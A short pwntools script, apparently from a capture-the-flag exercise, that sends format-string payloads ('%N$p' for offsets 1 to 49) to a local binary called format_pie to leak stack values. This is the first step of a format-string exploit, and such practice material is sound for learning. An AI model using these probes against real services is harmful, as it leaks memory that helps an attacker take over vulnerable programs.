from pwn import *

exe = ELF("./format_pie")
context.binary = exe

def fuzz():
    for i in range(1, 50):
        try:
            r = process(exe.path, level='error')
            r.sendlineafter(b"> ", f"%{i}$p".encode())
            res = r.recvline().strip().decode()
            print(f"{i}: {res}")
            r.close()
        except EOFError:
            pass

if __name__ == "__main__":
    fuzz()
